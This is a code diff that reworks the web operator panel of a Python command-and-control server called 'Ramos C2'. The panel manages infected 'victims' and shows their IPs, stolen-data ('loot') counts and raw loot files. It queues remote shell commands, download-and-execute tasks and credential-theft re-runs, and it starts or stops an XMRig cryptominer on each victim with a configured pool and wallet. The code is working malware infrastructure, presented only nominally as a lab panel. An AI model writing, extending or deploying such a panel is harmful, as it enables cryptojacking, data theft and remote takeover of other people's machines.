@@ -537,136 +537,429 @@ def mod_checkin():
         return jsonify({"status": "error"}), 400
 
 # ============================================================ SaaS panel UI
-PANEL_HTML = """<!doctype html><html><head><meta charset=utf-8>
+PANEL_HTML = """<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <title>Ramos C2 — panel</title>
 <style>
-body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:1100px;margin:0 auto}
-h1{color:#f85149}h2{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:6px}
-table{border-collapse:collapse;width:100%;margin:12px 0}
-td,th{border:1px solid #30363d;padding:6px 10px;text-align:left;font-size:13px}
-th{background:#161b22}a{color:#58a6ff}
-input,select,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;
- padding:8px 12px;border-radius:6px;font-family:inherit;font-size:13px}
-button{cursor:pointer}button:hover{border-color:#58a6ff}
-.row{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
-.card{border:1px solid #30363d;border-radius:8px;padding:14px;margin:12px 0;background:#0d1117}
-.ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
-#login{max-width:420px;margin:80px auto;text-align:center}
-pre{background:#161b22;padding:12px;border-radius:6px;overflow:auto;max-height:300px;font-size:12px}
-.pill{display:inline-block;padding:2px 10px;border-radius:10px;font-size:11px}
-.on{background:#1a3a24;color:#3fb950}.off{background:#3a1a1a;color:#f85149}
-</style></head><body>
-<div id=login>
-<h1>&#128293; RAMOS C2</h1>
-<p class=dim>lab panel — master key required</p>
-<input type=password id=key placeholder="master key" style="width:100%;margin:8px 0">
-<br><button onclick="login()">UNLOCK</button>
-<p id=lerr class=bad></p>
-<p class=dim style="font-size:11px">miner: open-source XMRig
-(<a href="https://github.com/xmrig/xmrig">github.com/xmrig/xmrig</a>) · start/stop per victim</p>
+:root{
+  --bg:#07070b; --panel:#0d0d14; --panel2:#12121c; --line:#1c1c2e;
+  --txt:#e8e6f5; --dim:#6a6788; --acc:#8030f0; --acc2:#a259ff;
+  --grn:#2ed573; --red:#ff4757; --cyn:#00d9ff; --warn:#ffa502;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--bg);color:var(--txt);min-height:100vh;
+  font-family:"JetBrains Mono","Fira Code",ui-monospace,Menlo,Consolas,monospace;
+}
+#bg{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(800px 480px at 50% -15%,rgba(128,48,240,.16),transparent 60%),
+             radial-gradient(600px 420px at 90% 110%,rgba(0,217,255,.05),transparent 55%)}
+#grid{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.3;
+  background-image:linear-gradient(rgba(128,48,240,.05) 1px,transparent 1px),
+                   linear-gradient(90deg,rgba(128,48,240,.05) 1px,transparent 1px);
+  background-size:46px 46px;animation:drift 28s linear infinite}
+@keyframes drift{to{background-position:46px 46px,46px 46px}}
+.wrap{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:30px 20px 60px}
+@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+.r{opacity:0;animation:rise .55s cubic-bezier(.2,.8,.2,1) forwards}
+
+h1{font-size:26px;font-weight:800;letter-spacing:-1px;
+  background:linear-gradient(90deg,#c9a5ff,#8030f0 45%,#5ee0ff);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+h2{font-size:12px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;
+  margin:26px 0 10px;padding-bottom:7px;border-bottom:1px solid var(--line)}
+.dim{color:var(--dim)} .small{font-size:11px}
+.ok{color:var(--grn)} .bad{color:var(--red)} .cy{color:var(--cyn)}
+
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px;
+  position:relative;overflow:hidden;transition:border .25s,box-shadow .25s}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--acc),transparent)}
+.card:hover{border-color:rgba(128,48,240,.5);box-shadow:0 8px 34px rgba(0,0,0,.4)}
+
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+input,select{background:#05050a;border:1px solid var(--line);color:var(--txt);
+  border-radius:10px;padding:12px 14px;font-family:inherit;font-size:13px;outline:none;
+  transition:border .2s,box-shadow .2s}
+input:focus,select:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(128,48,240,.18)}
+input::placeholder{color:#3a3760}
+button{display:inline-flex;align-items:center;gap:7px;padding:11px 20px;border-radius:10px;
+  font-size:12.5px;font-weight:700;font-family:inherit;cursor:pointer;border:none;
+  transition:transform .15s,filter .15s,box-shadow .15s,background .15s}
+button:active{transform:scale(.96)}
+button:disabled{opacity:.45;cursor:not-allowed;transform:none!important}
+.btn{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;
+  box-shadow:0 4px 16px rgba(128,48,240,.35)}
+.btn:hover{filter:brightness(1.12);transform:translateY(-1px)}
+.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+.ghost:hover{background:rgba(128,48,240,.1);border-color:var(--acc)}
+.danger{background:transparent;border:1px solid #4a1f26;color:var(--red)}
+.danger:hover{background:rgba(255,71,87,.12);border-color:var(--red)}
+.mini{padding:7px 13px;font-size:11.5px;border-radius:8px}
+
+table{border-collapse:collapse;width:100%;font-size:12.5px}
+td,th{border-bottom:1px solid var(--line);padding:9px 10px;text-align:left}
+th{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.8px}
+tr.vrow{cursor:pointer;transition:background .15s}
+tr.vrow:hover{background:rgba(128,48,240,.07)}
+tr.vrow.sel{background:rgba(128,48,240,.13)}
+
+.pill{display:inline-block;padding:3px 11px;border-radius:11px;font-size:10.5px;font-weight:700}
+.on{background:#12331f;color:var(--grn);box-shadow:0 0 10px rgba(46,213,115,.25)}
+.off{background:#2a1519;color:var(--red)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--grn);display:inline-block;
+  box-shadow:0 0 10px var(--grn);animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.35}}
+
+pre{background:#05050a;border:1px solid var(--line);padding:13px;border-radius:10px;
+  overflow:auto;max-height:320px;font-size:11.5px;line-height:1.6;white-space:pre-wrap;
+  word-break:break-all;color:#9aa0b4}
+code{color:var(--cyn)}
+
+#loginView{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.login-card{width:100%;max-width:400px;text-align:center;padding:34px 28px;
+  animation:rise .5s cubic-bezier(.2,.8,.2,1) both}
+.login-card h1{font-size:30px;margin-bottom:6px}
+.login-card form{display:flex;flex-direction:column;gap:11px;margin-top:20px}
+.login-card input{width:100%;text-align:center;font-size:14px}
+.login-card button{justify-content:center;padding:13px}
+#lerr{min-height:18px;font-size:12px;margin-top:10px}
+#toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,90px);z-index:50;
+  background:var(--panel2);border:1px solid var(--acc);color:var(--txt);padding:12px 22px;
+  border-radius:11px;font-size:13px;opacity:0;pointer-events:none;max-width:90vw;
+  transition:transform .35s cubic-bezier(.2,.9,.3,1.2),opacity .35s;
+  box-shadow:0 10px 40px rgba(0,0,0,.5)}
+#toast.show{transform:translate(-50%,0);opacity:1}
+#toast.err{border-color:var(--red)}
+.hint{font-size:11px;color:var(--dim);margin-top:9px;line-height:1.6}
+label{display:block;font-size:10.5px;font-weight:700;color:var(--dim);margin-bottom:6px;
+  text-transform:uppercase;letter-spacing:.6px}
+.field{flex:1;min-width:150px}
+.sw{display:flex;align-items:center;gap:10px;cursor:pointer;font-size:12px;color:var(--txt);
+  user-select:none;margin-top:12px}
+.sw input{appearance:none;width:42px;height:23px;background:var(--line);border-radius:12px;
+  position:relative;transition:.25s;cursor:pointer;flex:none;padding:0}
+.sw input::before{content:"";position:absolute;top:2px;left:2px;width:19px;height:19px;
+  background:#fff;border-radius:50%;transition:.25s cubic-bezier(.4,1.4,.5,1)}
+.sw input:checked{background:linear-gradient(135deg,var(--acc),var(--acc2))}
+.sw input:checked::before{transform:translateX(19px)}
+#appHead{display:flex;justify-content:space-between;align-items:flex-end;gap:14px;
+  flex-wrap:wrap;margin-bottom:6px}
+.chip{font-size:11px;padding:6px 13px;border:1px solid var(--line);border-radius:20px;
+  color:var(--dim);background:var(--panel2)}
+.chip.warn{border-color:var(--warn);color:var(--warn)}
+@media(max-width:640px){.wrap{padding:18px 13px}h1{font-size:21px}
+  td,th{padding:7px 6px;font-size:11.5px}.hide-s{display:none}}
+</style>
+</head>
+<body>
+<div id=bg></div><div id=grid></div>
+
+<div id=loginView>
+  <div class="card login-card">
+    <h1>RAMOS C2</h1>
+    <p class="dim small"><span class="dot"></span>&nbsp; lab control panel</p>
+    <form id=loginForm autocomplete=off>
+      <input type=password id=key placeholder="master key" autocomplete=off spellcheck=false>
+      <button type=submit class=btn id=unlockBtn>&#128273; UNLOCK</button>
+    </form>
+    <p id=lerr class=bad></p>
+    <p class="dim small" style="margin-top:14px">miner: open-source
+      <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener"
+         style="color:var(--cyn)">XMRig</a> · start / stop per victim · no accounts, one key</p>
+  </div>
 </div>
-<div id=app style="display:none">
-<h1>&#128293; RAMOS C2 <span class=dim style="font-size:13px">saas panel</span></h1>
-<div class=row>
-<button onclick="load()">&#10227; REFRESH</button>
-<span id=xmrig class=dim></span>
+
+<div id=appView class=wrap style="display:none">
+  <div id=appHead class=r">
+    <div>
+      <h1>RAMOS C2 <span class="dim" style="font-size:13px;-webkit-text-fill-color:var(--dim)">saas panel</span></h1>
+      <p class="dim small" id=clock></p>
+    </div>
+    <div class=row>
+      <span id=xmrig class=chip></span>
+      <button class="ghost mini" id=refreshBtn>&#10227; REFRESH</button>
+      <button class="danger mini" id=lockBtn>&#128274; LOCK</button>
+    </div>
+  </div>
+
+  <div class="card r" style="animation-delay:.08s">
+    <h2 style="margin-top:0">&#9878; miner defaults <span class="dim">(open-source XMRig)</span></h2>
+    <div class=row>
+      <div class=field><label>pool</label>
+        <input id=mpool placeholder="gulf.moneroocean.stream:10128" style="width:100%"
+               spellcheck=false></div>
+      <div class=field><label>wallet</label>
+        <input id=mwallet placeholder="XMR address" style="width:100%" spellcheck=false></div>
+      <div class=field style="max-width:130px"><label>cpu %</label>
+        <input id=mcpu placeholder="50" style="width:100%" spellcheck=false></div>
+      <button class=btn id=saveMinerBtn style="align-self:flex-end">SAVE</button>
+    </div>
+    <p class=hint>applied when you hit START without overrides · xmrig.exe served from your
+      panel · per-victim config.json · donate-level 1 (upstream min) · STOP kills it clean</p>
+  </div>
+
+  <div class="card r" style="animation-delay:.16s">
+    <h2 style="margin-top:0">&#128187; victims <span class="dim" id=vcount></span></h2>
+    <div style="overflow-x:auto">
+      <table><thead><tr><th>victim</th><th>last seen</th><th class=hide-s>ip</th>
+        <th>records</th><th>miner</th><th>ops</th></tr></thead>
+        <tbody id=vt></tbody></table>
+    </div>
+  </div>
+
+  <div class="card r" style="animation-delay:.24s">
+    <h2 style="margin-top:0">&#128269; detail <span class="dim" id=detTitle>— pick a victim</span></h2>
+    <div id=det class="dim small">click a row above to inspect loot counts, tasks, and results.</div>
+  </div>
+
+  <div class="card r" style="animation-delay:.32s">
+    <h2 style="margin-top:0">&#9881;&#65039; task</h2>
+    <div class=row>
+      <div class=field><label>victim</label><input id=tv placeholder="victim id" style="width:100%"></div>
+      <div class=field><label>type</label>
+        <select id=tt style="width:100%;padding:12px 10px">
+          <option value=shell>shell</option>
+          <option value=miner_start>miner_start</option>
+          <option value=miner_stop>miner_stop</option>
+          <option value=download_exec>download_exec</option>
+          <option value=steal>steal (re-run)</option>
+        </select></div>
+      <div class=field style="flex:2"><label>args (json)</label>
+        <input id=ta placeholder='{"cmd":"whoami"}' style="width:100%" spellcheck=false></div>
+      <button class=btn id=taskBtn style="align-self:flex-end">QUEUE</button>
+    </div>
+    <div id=tres style="margin-top:12px"></div>
+  </div>
 </div>
-<h2>miner defaults</h2>
-<div class=card><div class=row>
-<input id=mpool placeholder="pool  (e.g. gulf.moneroocean.stream:10128)" style="flex:2;min-width:260px">
-<input id=mwallet placeholder="wallet (XMR address)" style="flex:2;min-width:260px">
-<input id=mcpu placeholder="cpu% (1-100)" style="width:110px">
-<button onclick="saveMiner()">SAVE</button>
-</div><p class=dim style="font-size:11px">used when you hit START without overrides.
-xmrig.exe served from panel · config generated per victim · donate-level 1 (upstream minimum).</p></div>
-<h2>victims</h2>
-<table><tr><th>victim</th><th>last seen</th><th>ip</th><th>records</th><th>miner</th><th>ops</th></tr>
-<tbody id=vt></tbody></table>
-<h2>detail</h2>
-<div class=card><div class=row>
-<input id=vid placeholder="victim id" style="flex:1;min-width:200px">
-<button onclick="detail()">OPEN</button>
-</div><div id=det class=dim>pick a victim above.</div></div>
-<h2>shell / task</h2>
-<div class=card><div class=row>
-<input id=tv placeholder="victim id" style="flex:1;min-width:160px">
-<select id=tt><option value=shell>shell</option><option value=miner_start>miner_start</option>
-<option value=miner_stop>miner_stop</option><option value=download_exec>download_exec</option>
-<option value=steal>steal (re-run)</option></select>
-<input id=ta placeholder='args json (e.g. {"cmd":"whoami"})' style="flex:2;min-width:240px">
-<button onclick="sendTask()">QUEUE</button>
-</div><pre id=tres></pre></div>
-</div>
+
+<div id=toast></div>
+
 <script>
-let K=localStorage.getItem('ramos_master')||'';
-if(K){document.getElementById('key').value=K;}
-const H=()=>({'Content-Type':'application/json','X-Master-Key':K});
+"use strict";
+const $ = id => document.getElementById(id);
+let K = localStorage.getItem("ramos_master") || "";
+let selected = null, refreshing = false;
+const H = () => ({"Content-Type":"application/json","X-Master-Key":K});
+const esc = s => String(s == null ? "" : s).replace(/&/g,"&amp;").replace(/</g,"&lt;")
+  .replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+
+function toast(msg, err){
+  const t = $("toast");
+  t.textContent = msg;
+  t.className = err ? "show err" : "show";
+  clearTimeout(t._t);
+  t._t = setTimeout(() => t.className = "", 3000);
+}
+
+async function api(path, opts){
+  opts = opts || {};
+  opts.headers = H();
+  const r = await fetch(path, opts);
+  if (r.status === 403) throw new Error("key rejected");
+  if (r.status === 501) throw new Error("panel has no master key set");
+  if (!r.ok) {
+    let m = "http " + r.status;
+    try { const d = await r.json(); m = d.status || d.error || d.hint || m; } catch (e) {}
+    throw new Error(m);
+  }
+  return r.json();
+}
+
+function showApp(){
+  $("loginView").style.display = "none";
+  $("appView").style.display = "block";
+  load();
+  if (!showApp._t) showApp._t = setInterval(() => { if (!document.hidden) load(true); }, 15000);
+}
+
 async function login(){
- K=document.getElementById('key').value.trim();
- const r=await fetch('/api/login',{method:'POST',headers:H(),body:JSON.stringify({key:K})});
- if(r.ok){localStorage.setItem('ramos_master',K);
-  document.getElementById('login').style.display='none';
-  document.getElementById('app').style.display='block';load();}
- else document.getElementById('lerr').textContent='wrong key';
+  const btn = $("unlockBtn"), err = $("lerr");
+  K = $("key").value.trim();
+  if (!K){ err.textContent = "paste the master key"; return; }
+  btn.disabled = true; btn.textContent = "checking…"; err.textContent = "";
+  try {
+    await api("/api/login", {method:"POST", body:JSON.stringify({key:K})});
+    localStorage.setItem("ramos_master", K);
+    showApp();
+    toast("unlocked — welcome back");
+  } catch (e) {
+    err.textContent = e.message === "key rejected" ? "wrong key — try again" : e.message;
+    localStorage.removeItem("ramos_master");
+  } finally {
+    btn.disabled = false; btn.innerHTML = "&#128273; UNLOCK";
+  }
 }
-async function load(){
- const r=await fetch('/api/victims',{headers:H()});if(!r.ok)return;
- const d=await r.json();
- document.getElementById('xmrig').textContent='xmrig.exe: '+(d.xmrig_present?'present':'MISSING — drop official build next to c2_server.py');
- if(d.miner_defaults){document.getElementById('mpool').value=d.miner_defaults.pool||'';
-  document.getElementById('mwallet').value=d.miner_defaults.wallet||'';
-  document.getElementById('mcpu').value=d.miner_defaults.cpu_max||50;}
- let h='';
- for(const v of d.victims){
-  const m=v.miner&&v.miner.running;
-  h+='<tr><td><a href=# onclick="openV(\\''+v.id+'\\')">'+v.id+'</a></td><td>'+(v.last_seen||'?')+'</td>'
-   +'<td>'+(v.ip||'?')+'</td><td>'+(v.records||0)+'</td>'
-   +'<td><span class="pill '+(m?'on':'off')+'">'+(m?'MINING':'idle')+'</span></td>'
-   +'<td><button onclick="minerOp(\\''+v.id+'\\',\\'start\\')">start</button> '
-   +'<button onclick="minerOp(\\''+v.id+'\\',\\'stop\\')">stop</button></td></tr>';
- }
- document.getElementById('vt').innerHTML=h||'<tr><td colspan=6>no victims yet</td></tr>';
+
+function lock(){
+  K = ""; localStorage.removeItem("ramos_master");
+  clearInterval(showApp._t); showApp._t = null;
+  $("appView").style.display = "none";
+  $("loginView").style.display = "flex";
+  $("key").value = ""; $("key").focus();
+  toast("locked");
 }
-function openV(id){document.getElementById('vid').value=id;
- document.getElementById('tv').value=id;detail();}
-async function detail(){
- const id=document.getElementById('vid').value.trim();if(!id)return;
- const r=await fetch('/api/victim/'+encodeURIComponent(id),{headers:H()});
- document.getElementById('det').innerHTML='<pre>'+esc(await r.text())+'</pre>';
+
+function minerPill(v){
+  const m = v.miner && v.miner.running;
+  return '<span class="pill ' + (m ? "on" : "off") + '">' + (m ? "&#9889; MINING" : "idle") + "</span>";
 }
+
+async function load(quiet){
+  if (refreshing) return;
+  refreshing = true;
+  try {
+    const d = await api("/api/victims");
+    $("xmrig").innerHTML = d.xmrig_present
+      ? '<span class="ok">xmrig.exe: present</span>'
+      : '<span class="warn">xmrig.exe: MISSING — drop official build next to c2_server.py</span>';
+    if (d.miner_defaults){
+      if (!$("mpool").value) $("mpool").value = d.miner_defaults.pool || "";
+      if (!$("mwallet").value) $("mwallet").value = d.miner_defaults.wallet || "";
+      if (!$("mcpu").value) $("mcpu").value = d.miner_defaults.cpu_max || 50;
+    }
+    const rows = d.victims || [];
+    $("vcount").textContent = "— " + rows.length + " seen";
+    if (!rows.length){
+      $("vt").innerHTML = '<tr><td colspan=6 class=dim>no victims yet — run a client against the panel</td></tr>';
+    } else {
+      $("vt").innerHTML = rows.map(v =>
+        '<tr class="vrow' + (selected === v.id ? " sel" : "") + '" data-vid="' + esc(v.id) + '">'
+        + "<td><code>" + esc(v.id) + "</code>" + (v.agent ? ' <span class="pill" style="background:#12233a;color:var(--cyn)">agent</span>' : "") + "</td>"
+        + "<td>" + esc((v.last_seen || "?").replace("T"," ").slice(0,19)) + "</td>"
+        + '<td class=hide-s>' + esc(v.ip || "?") + "</td>"
+        + "<td>" + (v.records || 0) + "</td>"
+        + "<td>" + minerPill(v) + "</td>"
+        + '<td><button class="ghost mini" data-act="start" data-vid="' + esc(v.id) + '">start</button> '
+        + '<button class="danger mini" data-act="stop" data-vid="' + esc(v.id) + '">stop</button></td></tr>'
+      ).join("");
+    }
+    if (selected) await detail(selected, true);
+    $("clock").textContent = "auto-refresh 15s · last " + new Date().toLocaleTimeString();
+  } catch (e) {
+    if (!quiet){
+      if (e.message === "key rejected") lock();
+      else toast(e.message, true);
+    }
+  } finally { refreshing = false; }
+}
+
+async function detail(id, quiet){
+  selected = id;
+  if ($("tv").value !== id && !quiet) $("tv").value = id;
+  $("detTitle").textContent = "— " + id;
+  try {
+    const d = await api("/api/victim/" + encodeURIComponent(id));
+    const v = d.victim || {};
+    const counts = v.loot_counts || {};
+    const chips = Object.keys(counts).map(k => '<span class="pill" style="background:#1a1a2e;margin:2px 4px 2px 0">' + esc(k) + " " + counts[k] + "</span>").join("") || '<span class=dim>none decoded</span>';
+    const tasks = (d.tasks || []).map(t =>
+      '<div class="small" style="margin:3px 0"><span class="' + (t.done ? "ok" : "cy") + '">'
+      + (t.done ? "&#10003;" : "&#9679;") + "</span> " + esc(t.type) + " <span class=dim>· "
+      + esc((t.ts || "").replace("T"," ").slice(0,19)) + "</span> "
+      + (t.output_tail ? "<pre style='margin-top:5px'>" + esc(t.output_tail) + "</pre>" : "") + "</div>").join("") || '<span class=dim>no tasks</span>';
+    const results = (d.results || []).map(r =>
+      '<div class=small style="margin:4px 0"><span class=dim>' + esc((r.ts || "").replace("T"," ").slice(0,19))
+      + "</span> <pre style='margin-top:4px'>" + esc(typeof r.output === "string" ? r.output : JSON.stringify(r.output, null, 1)) + "</pre></div>").join("");
+    const sys = v.sysinfo ? esc(JSON.stringify(v.sysinfo)) : "<span class=dim>hidden</span>";
+    $("det").innerHTML =
+      '<div class=row style="margin-bottom:10px">' + minerPill(v)
+      + '<span class="pill" style="background:#1a1a2e">beacons ' + (v.beacons || 0) + "</span>"
+      + '<span class="pill" style="background:#1a1a2e">records ' + (v.records || 0) + "</span></div>"
+      + '<p class=small><span class=dim>sysinfo:</span> ' + sys + "</p>"
+      + '<p class=small style="margin:8px 0 4px"><span class=dim>loot:</span><br>' + chips + "</p>"
+      + '<p class="small" style="margin:12px 0 4px"><span class=dim>tasks:</span></p>' + tasks
+      + (results ? '<p class="small" style="margin:12px 0 4px"><span class=dim>results:</span></p>' + results : "")
+      + '<p class="small" style="margin:12px 0 0"><a href="/loot/shard_' + encodeURIComponent(id)
+      + '.json" style="color:var(--cyn)" target="_blank" rel="noopener">open raw shard &#8599;</a></p>';
+    if (!quiet){ document.querySelector('[data-vid="' + CSS.escape(id) + '"]'); $("det").scrollIntoView({behavior:"smooth",block:"nearest"}); }
+  } catch (e) { if (!quiet) toast(e.message, true); }
+}
+
+async function minerOp(vid, act){
+  try {
+    const d = await api("/api/miner", {method:"POST",
+      body:JSON.stringify({victim_id:vid, action:act})});
+    toast(act === "start" ? "miner_start queued → " + vid : "miner_stop queued → " + vid);
+    await load(true);
+    if (selected) await detail(selected, true);
+  } catch (e) { toast(e.message, true); }
+}
+
 async function sendTask(){
- const vid=document.getElementById('tv').value.trim();if(!vid)return;
- let args={};try{args=JSON.parse(document.getElementById('ta').value||'{}');}catch(e){}
- const type=document.getElementById('tt').value;
- // shell shorthand: {"cmd":"..."} or bare string
- if(type==='shell'&&typeof args==='string')args={cmd:args};
- const r=await fetch('/api/task',{method:'POST',headers:H(),
-  body:JSON.stringify({victim_id:vid,type,args})});
- document.getElementById('tres').textContent=await r.text();
+  const vid = $("tv").value.trim();
+  if (!vid){
+    $("tres").innerHTML = '<p class="small bad">&#10007; pick a victim id first</p>';
+    toast("pick a victim id first", true); return;
+  }
+  const type = $("tt").value;
+  let args = {};
+  const raw = $("ta").value.trim();
+  if (raw){
+    try { args = JSON.parse(raw); }
+    catch (e){
+      const m = "args must be valid JSON";
+      $("tres").innerHTML = '<p class="small bad">&#10007; ' + m + "</p>";
+      toast(m, true); return;
+    }
+  }
+  if (typeof args === "string") args = {cmd:args};
+  const btn = $("taskBtn");
+  btn.disabled = true; btn.textContent = "queueing…";
+  try {
+    const d = await api("/api/task", {method:"POST",
+      body:JSON.stringify({victim_id:vid, type:type, args:args})});
+    $("tres").innerHTML = '<p class="small ok">&#10003; queued ' + esc(type) + " → <code>"
+      + esc(vid) + "</code> <span class=dim>task " + esc(d.task ? d.task.id : "?") + "</span></p>";
+    toast("task queued: " + type);
+    if (selected) await detail(selected, true);
+  } catch (e) {
+    $("tres").innerHTML = '<p class="small bad">&#10007; ' + esc(e.message) + "</p>";
+    toast(e.message, true);
+  } finally { btn.disabled = false; btn.textContent = "QUEUE"; }
 }
-async function minerOp(vid,action){
- const r=await fetch('/api/miner',{method:'POST',headers:H(),
-  body:JSON.stringify({victim_id:vid,action})});
- alert(await r.text());load();
-}
+
 async function saveMiner(){
- const r=await fetch('/api/miner',{method:'POST',headers:H(),body:JSON.stringify({
-  pool:document.getElementById('mpool').value.trim(),
-  wallet:document.getElementById('mwallet').value.trim(),
-  cpu_max:parseInt(document.getElementById('mcpu').value||'50')}});
- alert(await r.text());
+  const btn = $("saveMinerBtn");
+  const cpu = parseInt($("mcpu").value || "50", 10);
+  if (isNaN(cpu) || cpu < 1 || cpu > 100){ toast("cpu must be 1-100", true); return; }
+  btn.disabled = true; btn.textContent = "saving…";
+  try {
+    await api("/api/miner", {method:"POST", body:JSON.stringify({
+      pool: $("mpool").value.trim(),
+      wallet: $("mwallet").value.trim(),
+      cpu_max: cpu
+    })});
+    toast("miner defaults saved");
+  } catch (e) { toast(e.message, true); }
+  finally { btn.disabled = false; btn.textContent = "SAVE"; }
 }
-function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
-</script></body></html>"""
+
+$("loginForm").addEventListener("submit", e => { e.preventDefault(); login(); });
+$("refreshBtn").addEventListener("click", () => load());
+$("lockBtn").addEventListener("click", lock);
+$("taskBtn").addEventListener("click", sendTask);
+$("saveMinerBtn").addEventListener("click", saveMiner);
+$("vt").addEventListener("click", e => {
+  const b = e.target.closest("button[data-act]");
+  if (b){ e.stopPropagation(); minerOp(b.dataset.vid, b.dataset.act); return; }
+  const row = e.target.closest("tr[data-vid]");
+  if (row) detail(row.dataset.vid);
+});
+
+if (K) login(); else $("key").focus();
+</script>
+</body></html>"""
 
 @app.route("/panel", methods=["GET"])
 @app.route("/admin", methods=["GET"])
 @app.route("/dashboard", methods=["GET"])
 def panel():
-    if request.path == "/dashboard" and request.args.get("legacy") is None:
-        pass  # /dashboard now serves the SaaS panel (was 404)
-    return Response(PANEL_HTML, mimetype="text/html")
+    # /dashboard used to 404 (dead dashboard); it now serves the SaaS panel
+    return Response(PANEL_HTML, mimetype="text/html",
+                    headers={"Cache-Control": "no-store"})
 
 @app.route("/", methods=["GET"])
 def index():
